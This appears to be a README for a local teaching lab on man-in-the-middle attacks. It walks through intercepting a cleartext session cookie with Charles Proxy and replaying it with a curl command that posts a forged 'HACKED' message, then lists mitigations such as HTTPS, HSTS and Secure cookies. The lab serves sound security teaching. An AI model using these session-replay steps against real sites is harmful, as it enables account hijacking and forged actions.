# Man In The Middle Attacks

## Overview
A man-in-the-middle attack (often abbreviated MITM) is when an attacker intercepts a request between a user and the site they're connecting to. If that request isn't encrypted, an attacker can read the information it contains. That is, if the session id is unencrypted, a man-in-the-middle can steal it

## Folders
[M👨ITM](../src/MITM)


## Setup For Simulating Attack
- Download & Install Charles Proxy
https://www.charlesproxy.com/download/

1. `vim ~/etc/hosts`
```bash
# add an entry with the following
127.0.0.1 localhost evil.com
```
2. `yarn installation` or `sudo npm i`
3. [M👨ITM](../src/MITM) or run `cd ../src/MITM`
4. run `sudo yarn start:both`
5. As the attacker, open Charles Proxy.
6. As the user, log into http://localhost.charlesproxy.com and then submit a message.
7. As the attacker, find the request in Charles, note that the session id is present as cleartext, modify it, and replay it.

**HINT**
Your curl req should include something like a data param edit that message and execute in terminal
```bash
## Sample Curl Req
curl -H 'Host: localhost.charlesproxy.com' -H 'DNT: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36' -H 'Content-type: application/x-www-form-urlencoded' -H 'Accept: */*' -H 'Origin: http://localhost.charlesproxy.com' -H 'Referer: http://localhost.charlesproxy.com/' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: _ga=GA1.2.522625857.1584068130; _gid=GA1.2.1231267101.1585434712; connect.sid=s%3ApZPCS7JbHhvDPRy-5v_NdVeGqI6P8f09.MEg50jPduLj8Kcuk2wKCKakS4Wj2SVpWy9hUg6Mu2HQ' --data-binary "message=HACKED" --compressed 'http://localhost.charlesproxy.com/'
```
8. As the user, refresh http://localhost.charlesproxy.com and notice there is now a message present that "you" didn't write.

## Setup For Mitigating Attack
- Set up https
- Redirect http to https
- Set the Secure cookie flag
- Set up HSTS